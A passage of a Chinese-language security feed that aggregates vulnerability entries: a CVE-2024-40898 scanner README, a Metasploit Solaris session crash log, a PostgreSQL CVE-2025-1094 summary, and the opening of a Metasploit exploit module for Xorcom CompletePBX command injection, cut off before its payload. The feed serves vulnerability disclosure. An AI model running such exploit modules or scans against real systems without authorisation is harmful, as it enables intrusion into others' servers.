attackers to bypass SSL certificate verification.</p><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>CVE-2024-40898 is a security issue in Apache HTTP Server which, under certain conditions, permits clients to bypass certificate validation. This can potentially allow man-in-the-middle (MitM) attacks over TLS.</p><h3 id="What-this-script-does"><a href="#What-this-script-does" class="headerlink" title="What this script does"></a>What this script does</h3><ul><li>Reads a list of host:port pairs from ssl-ports.txt.</li><li>For each entry:<ul><li>Establishes a TLS connection using a custom SSL context that disables certificate validation.</li><li>Sends a HEAD &#x2F; request to the server.</li><li>Examines the response:<ul><li>If the response includes 200 OK, the target is considered <em>potentially vulnerable</em>.</li><li>If no such response is returned, the target is marked as <em>safe</em>.</li><li>If any exception occurs during connection, the result is recorded as an <em>error</em>.</li></ul></li></ul></li></ul><h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><ul><li>Python 3.x</li></ul><h3 id="How-to-Use"><a href="#How-to-Use" class="headerlink" title="How to Use"></a>How to Use</h3><ol><li>Prepare your ssl-ports.txt file with a list of targets, one per line, in the format:<br>domain.com:443<br>example.org:443<ol start="2"><li>Run the script:</li></ol><pre><code class="language-bash"></code></pre></li></ol><p>python3 check_cve_40898.py<br>3.The output will label each domain as:<br>•[VULNERABLE] – possible certificate validation bypass<br>•[SAFE] – no issue detected<br>•[ERROR] – failed connection or SSL error<br> Disclaimer</p><p>This tool is provided for educational and testing purposes only. Ensure you have permission to scan the listed domains. The author is not responsible for any misuse of this code.</p><p>License</p><p>This project is licensed under the MIT License.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache HTTP Server SSL证书验证绕过漏洞&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
    <category term="配置问题" scheme="http://example.com/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Konica Minolta bizhub Multifunction Printer Pass-Back Attack Vulnerability (NOT FIXED)</title>
    <link href="http://example.com/2025/06/30/blog_2506286812/"/>
    <id>http://example.com/2025/06/30/blog_2506286812/</id>
    <published>2025-06-30T16:00:08.531Z</published>
    <updated>2025-06-30T16:00:08.526Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://www.rapid7.com/blog/post/cve-2025-6081-konica-minolta-bizhub-pass-back-attack-vulnerability-not-fixed/">https://www.rapid7.com/blog/post/cve-2025-6081-konica-minolta-bizhub-pass-back-attack-vulnerability-not-fixed/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://www.rapid7.com/blog/post/cve-2025-6081-konica-minolta-bizhub-pass-back-attack-vulnerability-not-fix</summary>
      
    
    
    
    <category term="安全博客" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="www.rapid7.com" scheme="http://example.com/tags/www-rapid7-com/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit Framework Solaris 文件读取方法崩溃漏洞</title>
    <link href="http://example.com/2025/06/30/github_274689488/"/>
    <id>http://example.com/2025/06/30/github_274689488/</id>
    <published>2025-06-30T15:46:20.729Z</published>
    <updated>2025-06-30T15:46:20.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Metasploit Framework Solaris 文件读取方法崩溃漏洞</p><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 在Solaris系统上，使用Metasploit Framework的<code>readable?</code>、<code>exists?</code>或<code>read_file</code>方法时，会导致会话因EOFError而崩溃。此问题在Solaris 10u2上测试确认。</p><p><strong>产品厂商：</strong> Rapid7</p><p><strong>产品名称：</strong> Metasploit Framework</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20103">https://github.com/rapid7/metasploit-framework/issues/20103</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><ol><li>Get a <code>solaris/x86/shell_reverse_tcp</code> session on Solaris (tested on Solaris 10u2)</li><li>Run a module which reads a file, or create a module which uses <code>readable?</code> &#x2F; <code>exists?</code> &#x2F; <code>read_file</code></li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs swift">msf6 post(solaris<span class="hljs-regexp">/gather/</span>enum_packages) <span class="hljs-operator">&gt;</span> run<br>[<span class="hljs-operator">*</span>] <span class="hljs-number">192.168</span>.<span class="hljs-number">200.166</span> <span class="hljs-operator">-</span> <span class="hljs-type">Command</span> shell session <span class="hljs-number">3</span> closed.<br>[<span class="hljs-operator">-</span>] <span class="hljs-type">Post</span> failed: <span class="hljs-type">EOFError</span> <span class="hljs-type">EOFError</span><br>[<span class="hljs-operator">-</span>] <span class="hljs-type">Call</span> stack:<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gems/</span><span class="hljs-number">3.3</span>.<span class="hljs-number">0</span><span class="hljs-regexp">/gems/</span>rex<span class="hljs-operator">-</span>core<span class="hljs-operator">-</span><span class="hljs-number">0.1</span>.<span class="hljs-number">33</span><span class="hljs-regexp">/lib/</span>rex<span class="hljs-regexp">/io/</span>stream.rb:<span class="hljs-number">224</span>:<span class="hljs-keyword">in</span> `get_once&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>base<span class="hljs-regexp">/sessions/</span>command_shell.rb:<span class="hljs-number">668</span>:<span class="hljs-keyword">in</span> `shell_read&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">64</span>:<span class="hljs-keyword">in</span> `block (<span class="hljs-number">2</span> levels) <span class="hljs-keyword">in</span> shell_read_until_token&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-operator">&lt;</span><span class="hljs-keyword">internal</span>:kernel<span class="hljs-operator">&gt;</span>:<span class="hljs-number">187</span>:<span class="hljs-keyword">in</span> `loop&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">63</span>:<span class="hljs-keyword">in</span> `block <span class="hljs-keyword">in</span> shell_read_until_token&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gems/</span><span class="hljs-number">3.3</span>.<span class="hljs-number">0</span><span class="hljs-regexp">/gems/</span>timeout<span class="hljs-operator">-</span><span class="hljs-number">0.4</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/lib/</span>timeout.rb:<span class="hljs-number">185</span>:<span class="hljs-keyword">in</span> `block <span class="hljs-keyword">in</span> timeout&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gems/</span><span class="hljs-number">3.3</span>.<span class="hljs-number">0</span><span class="hljs-regexp">/gems/</span>timeout<span class="hljs-operator">-</span><span class="hljs-number">0.4</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/lib/</span>timeout.rb:<span class="hljs-number">38</span>:<span class="hljs-keyword">in</span> `handle_timeout&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gems/</span><span class="hljs-number">3.3</span>.<span class="hljs-number">0</span><span class="hljs-regexp">/gems/</span>timeout<span class="hljs-operator">-</span><span class="hljs-number">0.4</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/lib/</span>timeout.rb:<span class="hljs-number">194</span>:<span class="hljs-keyword">in</span> `timeout&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">60</span>:<span class="hljs-keyword">in</span> `shell_read_until_token&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">158</span>:<span class="hljs-keyword">in</span> `shell_command_token_base&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/session/</span>provider<span class="hljs-operator">/</span>single_command_shell.rb:<span class="hljs-number">130</span>:<span class="hljs-keyword">in</span> `shell_command_token_unix&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>base<span class="hljs-regexp">/sessions/</span>unix_escaping.rb:<span class="hljs-number">4</span>:<span class="hljs-keyword">in</span> `shell_command_token&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>common.rb:<span class="hljs-number">197</span>:<span class="hljs-keyword">in</span> `cmd_exec&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>file.rb:<span class="hljs-number">313</span>:<span class="hljs-keyword">in</span> `exist<span class="hljs-operator">?</span>&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>file.rb:<span class="hljs-number">279</span>:<span class="hljs-keyword">in</span> `readable<span class="hljs-operator">?</span>&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>file.rb:<span class="hljs-number">488</span>:<span class="hljs-keyword">in</span> `read_file&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>lib<span class="hljs-regexp">/msf/</span>core<span class="hljs-regexp">/post/</span>solaris<span class="hljs-operator">/</span>system.rb:<span class="hljs-number">17</span>:<span class="hljs-keyword">in</span> `get_sysinfo&#x27;<br>[<span class="hljs-operator">-</span>]   <span class="hljs-regexp">/root/</span><span class="hljs-type">Desktop</span><span class="hljs-regexp">/metasploit-framework/</span>modules<span class="hljs-regexp">/post/</span>solaris<span class="hljs-regexp">/gather/</span>enum_packages.rb:<span class="hljs-number">32</span>:<span class="hljs-keyword">in</span> `run&#x27;<br>[<span class="hljs-operator">*</span>] <span class="hljs-type">Post</span> module execution completed<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Metasploit Framework Solaris 文件读取方法崩溃漏洞</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>PostgreSQL libpq SQL注入漏洞</title>
    <link href="http://example.com/2025/06/30/github_4188654971/"/>
    <id>http://example.com/2025/06/30/github_4188654971/</id>
    <published>2025-06-30T15:46:08.528Z</published>
    <updated>2025-06-30T15:46:08.526Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PostgreSQL libpq SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-1094</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> PostgreSQL libpq中的函数PQescapeLiteral()、PQescapeIdentifier()、PQescapeString()和PQescapeStringConn()对引用语法的处理不当，允许数据库输入提供者在某些使用模式下实现SQL注入。具体来说，SQL注入要求应用程序使用函数结果构造psql（PostgreSQL交互式终端）的输入。类似地，PostgreSQL命令行实用程序中的引用语法处理不当，当client_encoding为BIG5且server_encoding为EUC_TW或MULE_INTERNAL时，允许命令行参数源实现SQL注入。PostgreSQL 17.3、16.7、15.11、14.16和13.19之前的版本受影响。</p><p><strong>产品厂商：</strong> PostgreSQL</p><p><strong>产品名称：</strong> PostgreSQL libpq</p><p><strong>影响版本：</strong> version &lt; 13.19, 14.16, 15.11, 16.7, 17.3</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20363">https://github.com/rapid7/metasploit-framework/issues/20363</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Improper neutralization of quoting syntax in PostgreSQL libpq functions PQescapeLiteral(), PQescapeIdentifier(), PQescapeString(), and PQescapeStringConn() allows a database input provider to achieve SQL injection in certain usage patterns. Specifically, SQL injection requires the application to use the function result to construct input to psql, the PostgreSQL interactive terminal. Similarly, improper neutralization of quoting syntax in PostgreSQL command line utility programs allows a source of command line arguments to achieve SQL injection when client_encoding is BIG5 and server_encoding is one of EUC_TW or MULE_INTERNAL. Versions before PostgreSQL 17.3, 16.7, 15.11, 14.16, and 13.19 are affected.<br>[Summary was taken from <a href="https://nvd.nist.gov/vuln/detail/cve-2025-1094">NVD</a>]</p><p>References</p><ul><li><a href="https://nvd.nist.gov/vuln/detail/cve-2025-1094">https://nvd.nist.gov/vuln/detail/cve-2025-1094</a></li><li><a href="https://access.redhat.com/security/cve/cve-2025-1094">https://access.redhat.com/security/cve/cve-2025-1094</a></li><li><a href="https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/">https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PostgreSQL libpq SQL注入漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</title>
    <link href="http://example.com/2025/06/30/github_174279459/"/>
    <id>http://example.com/2025/06/30/github_174279459/</id>
    <published>2025-06-30T15:45:46.583Z</published>
    <updated>2025-06-30T15:45:46.577Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Xorcom CompletePBX Authenticated Command Injection via Task Scheduler</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-30004</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Xorcom CompletePBX 5.2.35及更早版本中存在一个通过任务调度功能实现的认证命令注入漏洞。该漏洞允许具有超级管理员权限的用户（admin）利用任务调度功能中的用户输入不当清理问题，以Web服务器权限执行任意命令。即使创建具有最大权限的新用户，该漏洞也无法被利用。</p><p><strong>产品厂商：</strong> Xorcom</p><p><strong>产品名称：</strong> CompletePBX</p><p><strong>影响版本：</strong> &lt;&#x3D; 5.2.35</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/d0aaf70bbb8bce242885e82d201a0bc707a89b58/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb">https://github.com/rapid7/metasploit-framework/blob/d0aaf70bbb8bce242885e82d201a0bc707a89b58/modules%2Fexploits%2Flinux%2Fhttp%2Fxorcom_completepbx_scheduler.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Xorcom CompletePBX Authenticated Command Injection via Task Scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits an authenticated command injection vulnerability <span class="hljs-keyword">in</span> Xorcom CompletePBX<br>          versions &lt;= <span class="hljs-number">5.2</span>.<span class="hljs-number">35.</span> The issue resides <span class="hljs-keyword">in</span> the task scheduler functionality, where user-controlled<br>          input <span class="hljs-keyword">is</span> improperly sanitized, allowing arbitrary command execution <span class="hljs-keyword">with</span> web server privileges.<br><br>          Only the **superadmin** user (`admin`) has the necessary permissions <span class="hljs-keyword">to</span> trigger this exploit.<br>          Even <span class="hljs-keyword">when</span> creating a <span class="hljs-keyword">new</span> user <span class="hljs-keyword">with</span> maximum privileges, the vulnerability does <span class="hljs-keyword">not</span> work.<br>        &#125;,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Valentin Lobstein&#x27;</span> <span class="hljs-comment"># Research and module development</span><br>        ],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-30004&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://www.xorcom.com/products/completepbx/&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://chocapikk.com/posts/2025/completepbx/&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ARCH_CMD],<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Unix/Linux Command Shell&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-03-02&#x27;</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid CompletePBX password&#x27;</span>]),<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is running CompletePBX...&#x27;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;No response from target.&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Unknown(<span class="hljs-string">&quot;Unexpected HTTP response code: <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>) <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br><br>    doc = res.get_html_document<br><br>    <span class="hljs-keyword">if</span> doc.at(<span class="hljs-string">&#x27;//meta[@name=&quot;description&quot;][@content=&quot;CompletePBX&quot;]&#x27;</span>) ||<br>       doc.at(<span 